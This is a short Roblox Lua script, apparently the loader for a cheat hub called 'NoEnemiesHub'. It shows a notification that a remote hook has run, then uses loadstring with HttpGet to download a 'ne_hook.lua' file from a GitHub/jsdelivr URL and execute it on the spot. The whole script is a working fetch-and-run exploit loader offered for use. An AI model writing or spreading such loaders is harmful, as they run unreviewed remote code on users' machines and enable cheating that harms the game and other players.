local starterGUI = game:GetService("StarterGui")

starterGUI:SetCore("SendNotification", {
	Title = "NoEnemiesHub",
	Text = "Hook remote executed (visualizer included).",
	Icon = "rbxassetid://135351041318579",
	Duration = 10,
	Button1 = "OK",
})

loadstring(game:HttpGet("https://cdn.jsdelivr.net/gh/Loadstringl/TORT@81028955f487/ne_hook.lua"))()
